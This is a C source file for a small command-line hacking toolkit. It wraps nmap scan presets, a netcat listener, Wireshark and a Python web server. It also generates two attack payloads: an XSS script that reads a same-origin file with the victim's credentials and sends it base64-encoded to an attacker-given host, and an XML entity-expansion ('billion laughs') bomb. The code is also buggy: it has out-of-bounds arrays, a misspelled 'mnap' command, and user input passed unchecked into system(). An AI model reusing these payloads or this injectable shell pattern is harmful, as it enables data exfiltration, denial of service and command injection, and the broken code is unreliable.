#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void help()
{
    //ipconfig,ifconfig ip addr,
    printf("  -sI show ip the machine is connected to\n");
    //with more details: arp, 
    printf("  -sIm show ip with more details\n");
    //default scan:nmap -sC -sV -v <ip addr>
    printf("  -sO our typical scan\n");
    //default scan with given port:nmap -sC -sV -v <ip addr> -p <port number>
    printf("  -sP default scan with given port\n");
    //intense scan plus UDP: nmap -sS -sU -T4 -v --traceroute
    printf("  -iU intense scan plus UDP\n");
    //slow comprenhesive scan:nmap -sS -sU -T4 -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --traceroute
    printf("  -scs slow comprenhesive scan\n");
    //intensive scan, all TCP Ports:nmap -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389 --traceroute
    printf("  -sa intensive scan, all TCP Ports\n");
    //intense scan,no ping: nmap -T4 -A -v -Pn --traceroute
    printf("  -iN intense scan,no ping\n");
    //intense scan:nmap -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389 --traceroute -sC -sV
    printf("  -i intense scan\n");
    //quick scan:nmap -T4 --traceroute
    printf("  -q quick scan\n");
    //default,base nse script,force ipv6:nmap --script=default,safe -sS -sV -O -T4 -v -6 --traceroute
    printf("  -sF default,base nse script,force ipv6:\n");
    //default,base nse script:nmap --script=default,safe -sS -sV -O -T4 -v --traceroute
    printf("  -sdb default,base nse script\n");
    //default aggresive:nmap -A -sS -sV -O -T4 -v --traceroute
    printf("  -sA default aggresive\n");
    //default force ipv6:nmap -sS -sV -O -T4 -v -6 --traceroute
    printf("  -d6 default force ipv6\n");
    //default:mnap -sS -sV -O -T4 -v --traceroute 
    printf("  -d default scan\n");
    //wireshark
    printf("  -w watch live the traffic\n");
    //nc -lnvc
    printf("  -l listen to a port\n");
    //python3 -m <port number>
    printf("  -c create simple server with port\n");
    //
    printf("  -xs xss code creation\n");
    //
    printf("  -xm create xml bomb size given by you\n");
    //
    printf("  -sd send deaufthentication packets\n");
}

void check(int system_inf)
{
    //check_nmap,check_wireshark,check_python,check_netcat
    int check_all[3],i,install;
    char a;
    //freopen("NUL", "w", stdout); can be used too,it's the same thing
    //nmap checking will execute but will not display any output or errors. > NUL 2>&1
    check_all[0]=system("nmap --version > NUL 2>&1");
    //wireshark checking will execute but will not display any output or errors. > NUL 2>&1
    check_all[1]=system("wireshark --version > NUL 2>&1");
    //python3 checking will execute but will not display any output or errors. > NUL 2>&1
    check_all[2]=system("python3 --version > NUL 2>&1");
    //netcat checking will execute but will not display any output or errors. > NUL 2>&1
    check_all[3]=system("nc -h > NUL 2>&1");
    int sum=0;
    //for each check we add it if it succeed
    for(i=0;i<=3;i++)
    {
        if(check_all[i]==0)
        {
            sum++;
        }
    }
    //if all tools exist then  we give the user a message
    if(sum==4)
    {
        printf("all tools are checked\n");
    }
    else
    {
        printf("Do you want to install the requirments? [y/n]\n");
        //loop that guarantes the a is y or Y or n or N as an asnwer
        while(1)
        {
            scanf("%c",&a);
            if(a=='y' || a=='Y' || a=='n' || a=='N')
            {
                //we stop the loop if the answer is what we wanted it to be
                break;
            }
            else
            {
                //otherwise we help the user with a message
                printf("answer must be y for yes or n for no\n");
            }
        }
        int check_all_installed=0;
        if(a=='y' || a=='Y')
        {
            //for each tool we install it with different way because of the os that is currently running
            if(system_inf==0)
            {
                //installation on linux and unix
                if(check_all[0]!=0)
                {
                    install=system("sudo apt install nmap");
                    if(install==0)
                    {
                        check_all_installed++;
                        printf("nmap installed\n");
                    }
                    else
                    {
                        printf("nmap couldn't get installed");
                    }
                }
                else if(check_all[1]!=0)
                {
                    install=system("sudo install wireshark");
                    if(install==0)
                    {
                        check_all_installed++;
                        printf("wireshark installed\n");
                    }
                    else
                    {
                        printf("wireshark couldn't get installed");
                    }
                }
                else if(check_all[2]!=0)
                {
                    install=system("sudo install python3");
                    if(install==0)
                    {
                        check_all_installed++;
                        printf("python3 installed\n");
                    }
                    else
                    {
                        printf("python3 couldn't get installed,try to install it from python.org or anywhere else\n");
                    }
                }
                else if(check_all[3]!=0)
                {
                    install=system("sudo install netcat");
                    if(install==0)
                    {
                        check_all_installed++;
                        printf("netcat installed\n");
                    }
                    else
                    {
                        printf("netcat couldn't get installed\n");
                    }
                }
            } 
            if( check_all_installed==4)
            {
                printf("Now all tools are installed");
            }
            else
            {
                printf("Aborting\n");
            }     
        }
        else
        {
            printf("exiting\n");
        }
    }
    system("rm NUL");
}

void list_wifi_networks() {
    FILE *fp;
    char buffer[1024];  // Buffer to store the output
    // Run the nmcli command to list available Wi-Fi networks
    fp = popen("nmcli device wifi list", "r");
    if (fp == NULL) {
        perror("Error executing nmcli command");
        return;
    }

    // Read the output of the command line by line
    printf("Available Wi-Fi networks:\n");
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        printf("%s", buffer);  // Print each line of the output
    }

    // Close the file pointer (close the pipe)
    fclose(fp);
}

void nmap(char *ip,char command[])
{
    char full_command[200];
    strcpy(full_command,command);
    strcat (full_command, ip);
    system(full_command);
}

void nmap_(char *ip,char *port,char command[])
{
    //char *full_command=command;
    char full_command[200];
    strcpy(full_command,command);
    strcat (full_command, ip);
    strcat(full_command," ");
    strcat(full_command,"-p ");
    strcat(full_command,port);
    system(full_command);
}

int main(int argc,char* argv[])
{
    int system_inf=0,n;
    char y[0],c[0],*port,*ip,full_command[100];
    #ifdef __linux__
        //windows
        system_inf=0;
    #else
        //not in list
        system_inf=-1;
        printf("system not in list\n");
    #endif
    //checking requirments
    check(system_inf);
    //a help message to the user
    printf("For help type -h\n");
    //if you want to print what argv[1] has:printf("%s\n",argv[1]);
    //compare what 2 pointers has (the content)
    int command;
    if(strcmp(argv[1], "-h") == 0)
    {
    //calling help() function to print everything the user needs
        help();
    }
    if(argc==2)
    {
        if(strcmp(argv[1], "-sI") == 0)
        {
            if(system_inf==0)
            {
                command=system("ip addr");
                if(command !=0)
                {
                    command=system("ifconfig");
                }
            }
        }
        else if(strcmp(argv[1], "-sIm") == 0)
        {
            if(system_inf==60)
            {
                command=system("arp");
                if(command !=0)
                {
                    command=system("nmcli device show");
                }
            }
        }
        else if(strcmp(argv[1], "-sO") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-sP") == 0)
        {
            printf("You must give an ip address and port number,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-iU") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-scs") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-sa") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-iN") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-i") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-q") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-sF") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-sdb") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-sA") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-d6") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-d") == 0)
        {
            printf("You must give an ip address,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-w") == 0)
        {
            system("sudo wireshark");
        }
        else if(strcmp(argv[1], "-l") == 0)
        {
            printf("You must give a port number,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-c") == 0)
        {
            printf("You must give a port number,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-xs") == 0)
        {
            printf("You must give the file you want to read from the server and its ip address\n");
        }
        else if(strcmp(argv[1], "-xm") == 0)
        {
            printf("You must give a number,the number tells how big the bomb be\n");
        }
        else if(strcmp(argv[1], "-sd") == 0)
        {
            printf("Choose one of the following internet connections\n");
            if (system_inf==0)
            {
                list_wifi_networks();
            }
        }
    }
    else if (argc == 3)
    {
        if(strcmp(argv[1], "-sO") == 0)
        {
            nmap(argv[2],"nmap -sC -sV -v ");
        }
        else if(strcmp(argv[1], "-sP") == 0)
        {
            printf("You must give aport number too,proccess aborts\n");
        }
        else if(strcmp(argv[1], "-iU") == 0)
        {
            nmap(argv[2],"nmap -sS -sU -T4 -v --traceroute ");
        }
        else if(strcmp(argv[1], "-scs") == 0)
        {
            nmap(argv[2],"nmap -sS -sU -T4 -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --traceroute ");
        }
        else if(strcmp(argv[1], "-sa") == 0)
        {
            nmap(argv[2],"nmap -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389 --traceroute ");
        }
        else if(strcmp(argv[1], "-iN") == 0)
        {
            nmap(argv[2],"nmap -T4 -A -v -Pn --traceroute ");
        }
        else if(strcmp(argv[1], "-i") == 0)
        {
            nmap(argv[2],"nmap -T4 -A -v -PE -PS22,25,80 -PA21,23,80,3389 --traceroute -sC -sV ");
        }
        else if(strcmp(argv[1], "-q") == 0)
        {
            nmap(argv[2],"nmap -T4 --traceroute ");
        }
        else if(strcmp(argv[1], "-sF") == 0)
        {
            nmap(argv[2],"nmap --script=default,safe -sS -sV -O -T4 -v -6 --traceroute ");
        }
        else if(strcmp(argv[1], "-sdb") == 0)
        {
            nmap(argv[2],"nmap --script=default,safe -sS -sV -O -T4 -v --tracerout ");
        }
        else if(strcmp(argv[1], "-sA") == 0)
        {
            nmap(argv[2],"nmap -A -sS -sV -O -T4 -v --traceroute ");
        }
        else if(strcmp(argv[1], "-d6") == 0)
        {
            nmap(argv[2],"nmap -sS -sV -O -T4 -v -6 --traceroute ");
        }
        else if(strcmp(argv[1], "-d") == 0)
        {
            nmap(argv[2],"mnap -sS -sV -O -T4 -v --traceroute ");
        }
        else if(strcmp(argv[1], "-w") == 0)
        {
            printf("too many arguments\n");
        }
        else if(strcmp(argv[1], "-l") == 0)
        {
            //storing in a pointer the address of the argv[2]
            port=argv[2];
            strcpy(full_command,"nc -tunlp ");
            strcat (full_command, port);
            //executing the full_comand
            system(full_command);
        }
        else if(strcmp(argv[1], "-c") == 0)
        {
            //storing in a pointer the address of the argv[2]
            port=argv[2];
            strcpy(full_command,"python3 -m http.server ");
            strcat (full_command, port);
            //executing the full_comand
            system(full_command);
        }
        else if(strcmp(argv[1], "-xs") == 0)
        {
            printf("give the ip address\n");

        }
        else if(strcmp(argv[1], "-xm") == 0)
        {
            //converting the argv[2] into an integer
            int x = atoi(argv[2])+1;
            if(x>0)
            {
                FILE *fptr;
                int i;
                // Open a file in writing mode
                fptr = fopen("bomb.txt", "w");
                fprintf(fptr, "<?xml version=\"1.1\"?>\n<!DOCTYPE lolz [\n\t<!ENTITY lol \"lol\">");
                if(x>=2)
                {
                    for(i=2;i<x;i++)
                    {
                        fprintf(fptr,"\n\t<!ENTITY lol");
                        //convert i to char
                        y[0] = i + '0';
                        printf("%c",y[0]);
                        fprintf(fptr,y);
                        fprintf(fptr," ");
                        c[0] = (i-1) +'0';
                        printf("%c\n",c[0]);
                        for(int j=1;j<=10;j++)
                        {
                            if(j==1 || j==10)
                            {
                                fprintf(fptr,"\"");
                            }
                            fprintf(fptr,"&lo");
                            fprintf(fptr,c);
                            fprintf(fptr,";");
                        }
                        fprintf(fptr,">");
                    }
                }
                fprintf(fptr,"\n]>\n<lolz>&lol");
                fprintf(fptr,argv[2]);
                fprintf(fptr,";</lolz>");
                fclose(fptr);
            }
        }
    }
    else if (argc==4)
    {
        if(strcmp(argv[1], "-sP") == 0)
        {
            nmap_(argv[2],argv[3],"nmap -sC -sV -v ");
        }
        else if(strcmp(argv[1], "-xs") == 0)
        {
            FILE *fptr;
            //opening the xss.txt file in write mode
            fptr=fopen("xss.txt","w");
            //we put the data we need
            fprintf(fptr,"<script>\nfetch(\"/");
            fprintf(fptr,argv[2]);
            fprintf(fptr,"\", {method:'GET',mode:'no-cors',credentials:'same-origin'})\n\t.then(response => response.text())\n\t.then(text => { \n\t\tfetch('http://");
            fprintf(fptr,argv[3]);
            fprintf(fptr,"' + btoa(text), {mode:'no-cors'}); \n\t});\n</script>");
            fclose(fptr);
        }
        else
        {
            printf("Too many arguments\n");
        }
    }
    else
    {
        printf("Too many argumrnts\n");
    }
    
    return 0;
}
